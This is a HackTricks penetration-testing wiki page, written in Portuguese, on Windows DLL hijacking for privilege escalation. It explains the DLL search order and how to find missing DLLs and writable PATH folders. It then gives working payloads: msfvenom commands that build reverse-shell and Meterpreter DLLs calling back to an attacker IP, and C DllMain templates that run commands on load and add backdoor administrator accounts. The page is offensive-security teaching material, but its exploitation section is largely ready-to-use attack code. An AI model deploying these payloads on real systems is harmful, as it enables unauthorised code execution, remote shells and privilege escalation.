# Dll Hijacking

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty tip**: **inscreva-se** para **Intigriti**, uma **plataforma de bug bounty premium criada por hackers, para hackers**! Junte-se a nós em [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoje e comece a ganhar recompensas de até **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Basic Information

DLL Hijacking envolve manipular um aplicativo confiável para carregar uma DLL maliciosa. Este termo abrange várias táticas como **DLL Spoofing, Injection, e Side-Loading**. É utilizado principalmente para execução de código, alcançando persistência e, menos comumente, escalonamento de privilégios. Apesar do foco no escalonamento aqui, o método de hijacking permanece consistente entre os objetivos.

### Common Techniques

Vários métodos são empregados para DLL hijacking, cada um com sua eficácia dependendo da estratégia de carregamento de DLL do aplicativo:

1. **Substituição de DLL**: Trocar uma DLL genuína por uma maliciosa, opcionalmente usando DLL Proxying para preservar a funcionalidade da DLL original.
2. **Hijacking da Ordem de Busca de DLL**: Colocar a DLL maliciosa em um caminho de busca à frente da legítima, explorando o padrão de busca do aplicativo.
3. **Hijacking de DLL Fantasma**: Criar uma DLL maliciosa para um aplicativo carregar, pensando que é uma DLL necessária que não existe.
4. **Redirecionamento de DLL**: Modificar parâmetros de busca como `%PATH%` ou arquivos `.exe.manifest` / `.exe.local` para direcionar o aplicativo para a DLL maliciosa.
5. **Substituição de DLL WinSxS**: Substituir a DLL legítima por uma maliciosa no diretório WinSxS, um método frequentemente associado ao side-loading de DLL.
6. **Hijacking de DLL com Caminho Relativo**: Colocar a DLL maliciosa em um diretório controlado pelo usuário com o aplicativo copiado, semelhante às técnicas de Execução de Proxy Binário.

## Finding missing Dlls

A maneira mais comum de encontrar DLLs ausentes em um sistema é executar [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) do sysinternals, **definindo** os **seguintes 2 filtros**:

![](<../../.gitbook/assets/image (311).png>)

![](<../../.gitbook/assets/image (313).png>)

e apenas mostrar a **Atividade do Sistema de Arquivos**:

![](<../../.gitbook/assets/image (314).png>)

Se você está procurando por **dlls ausentes em geral**, você **deixa** isso rodando por alguns **segundos**.\
Se você está procurando por uma **dll ausente dentro de um executável específico**, você deve definir **outro filtro como "Nome do Processo" "contém" "\<nome do exec>", executá-lo e parar de capturar eventos**.

## Exploiting Missing Dlls

Para escalar privilégios, a melhor chance que temos é ser capaz de **escrever uma dll que um processo privilegiado tentará carregar** em algum **lugar onde será pesquisada**. Portanto, seremos capazes de **escrever** uma dll em uma **pasta** onde a **dll é pesquisada antes** da pasta onde a **dll original** está (caso estranho), ou seremos capazes de **escrever em alguma pasta onde a dll será pesquisada** e a **dll original não existe** em nenhuma pasta.

### Dll Search Order

**Dentro da** [**documentação da Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **você pode encontrar como as DLLs são carregadas especificamente.**

**Aplicativos do Windows** procuram por DLLs seguindo um conjunto de **caminhos de busca pré-definidos**, aderindo a uma sequência particular. O problema do DLL hijacking surge quando uma DLL prejudicial é estrategicamente colocada em um desses diretórios, garantindo que ela seja carregada antes da DLL autêntica. Uma solução para prevenir isso é garantir que o aplicativo use caminhos absolutos ao se referir às DLLs que requer.

Você pode ver a **ordem de busca de DLL em sistemas de 32 bits** abaixo:

1. O diretório de onde o aplicativo foi carregado.
2. O diretório do sistema. Use a função [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) para obter o caminho deste diretório.(_C:\Windows\System32_)
3. O diretório do sistema de 16 bits. Não há função que obtenha o caminho deste diretório, mas ele é pesquisado. (_C:\Windows\System_)
4. O diretório do Windows. Use a função [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) para obter o caminho deste diretório.
1. (_C:\Windows_)
5. O diretório atual.
6. Os diretórios listados na variável de ambiente PATH. Note que isso não inclui o caminho por aplicativo especificado pela chave de registro **App Paths**. A chave **App Paths** não é usada ao calcular o caminho de busca da DLL.

Essa é a **ordem de busca padrão** com **SafeDllSearchMode** habilitado. Quando está desabilitado, o diretório atual sobe para o segundo lugar. Para desabilitar esse recurso, crie o valor de registro **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** e defina-o como 0 (o padrão é habilitado).

Se a função [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) for chamada com **LOAD\_WITH\_ALTERED\_SEARCH\_PATH**, a busca começa no diretório do módulo executável que **LoadLibraryEx** está carregando.

Finalmente, note que **uma dll pode ser carregada indicando o caminho absoluto em vez de apenas o nome**. Nesse caso, essa dll **será pesquisada apenas nesse caminho** (se a dll tiver dependências, elas serão pesquisadas como se fossem carregadas apenas pelo nome).

Existem outras maneiras de alterar a ordem de busca, mas não vou explicá-las aqui.

#### Exceptions on dll search order from Windows docs

Certas exceções à ordem padrão de busca de DLL são notadas na documentação do Windows:

* Quando uma **DLL que compartilha seu nome com uma já carregada na memória** é encontrada, o sistema ignora a busca usual. Em vez disso, ele realiza uma verificação de redirecionamento e um manifesto antes de retornar à DLL já na memória. **Nesse cenário, o sistema não realiza uma busca pela DLL**.
* Em casos onde a DLL é reconhecida como uma **DLL conhecida** para a versão atual do Windows, o sistema utilizará sua versão da DLL conhecida, juntamente com quaisquer de suas DLLs dependentes, **abrindo mão do processo de busca**. A chave de registro **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contém uma lista dessas DLLs conhecidas.
* Se uma **DLL tiver dependências**, a busca por essas DLLs dependentes é realizada como se fossem indicadas apenas por seus **nomes de módulo**, independentemente de a DLL inicial ter sido identificada através de um caminho completo.

### Escalating Privileges

**Requisitos**:

* Identificar um processo que opera ou operará sob **diferentes privilégios** (movimento horizontal ou lateral), que está **faltando uma DLL**.
* Garantir que o **acesso de escrita** esteja disponível para qualquer **diretório** no qual a **DLL** será **pesquisada**. Este local pode ser o diretório do executável ou um diretório dentro do caminho do sistema.

Sim, os requisitos são complicados de encontrar, pois **por padrão é meio estranho encontrar um executável privilegiado faltando uma dll** e é ainda **mais estranho ter permissões de escrita em uma pasta do caminho do sistema** (você não pode por padrão). Mas, em ambientes mal configurados, isso é possível.\
No caso de você ter sorte e se encontrar atendendo aos requisitos, você pode verificar o projeto [UACME](https://github.com/hfiref0x/UACME). Mesmo que o **objetivo principal do projeto seja contornar o UAC**, você pode encontrar lá um **PoC** de um Dll hijacking para a versão do Windows que você pode usar (provavelmente apenas mudando o caminho da pasta onde você tem permissões de escrita).

Note que você pode **verificar suas permissões em uma pasta** fazendo:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
E **verifique as permissões de todas as pastas dentro do PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Você também pode verificar as importações de um executável e as exportações de um dll com:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Para um guia completo sobre como **abusar do Dll Hijacking para escalar privilégios** com permissões para escrever em uma **pasta do System Path**, consulte:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### Ferramentas automatizadas

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) verificará se você tem permissões de escrita em qualquer pasta dentro do system PATH.\
Outras ferramentas automatizadas interessantes para descobrir essa vulnerabilidade são as **funções do PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ e _Write-HijackDll._

### Exemplo

Caso você encontre um cenário explorável, uma das coisas mais importantes para explorá-lo com sucesso seria **criar um dll que exporte pelo menos todas as funções que o executável importará dele**. De qualquer forma, observe que o Dll Hijacking é útil para [escalar do nível de Integridade Média para Alta **(contornando o UAC)**](../authentication-credentials-uac-and-efs.md#uac) ou de [**Alta Integridade para SYSTEM**](./#from-high-integrity-to-system)**.** Você pode encontrar um exemplo de **como criar um dll válido** dentro deste estudo de dll hijacking focado em dll hijacking para execução: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Além disso, na **próxima seção**, você pode encontrar alguns **códigos dll básicos** que podem ser úteis como **modelos** ou para criar um **dll com funções não requeridas exportadas**.

## **Criando e compilando Dlls**

### **Dll Proxificando**

Basicamente, um **Dll proxy** é um Dll capaz de **executar seu código malicioso quando carregado**, mas também de **expor** e **funcionar** como **esperado** ao **revezar todas as chamadas para a biblioteca real**.

Com a ferramenta [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ou [**Spartacus**](https://github.com/Accenture/Spartacus), você pode realmente **indicar um executável e selecionar a biblioteca** que deseja proxificar e **gerar um dll proxificado** ou **indicar o Dll** e **gerar um dll proxificado**.

### **Meterpreter**

**Obter rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtenha um meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Criar um usuário (x86, eu não vi uma versão x64):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Seu próprio

Note que em vários casos a Dll que você compila deve **exportar várias funções** que serão carregadas pelo processo da vítima; se essas funções não existirem, o **binário não conseguirá carregá-las** e o **exploit falhará**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Referências

* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Dica de bug bounty**: **inscreva-se** na **Intigriti**, uma **plataforma premium de bug bounty criada por hackers, para hackers**! Junte-se a nós em [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoje e comece a ganhar recompensas de até **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte ao HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
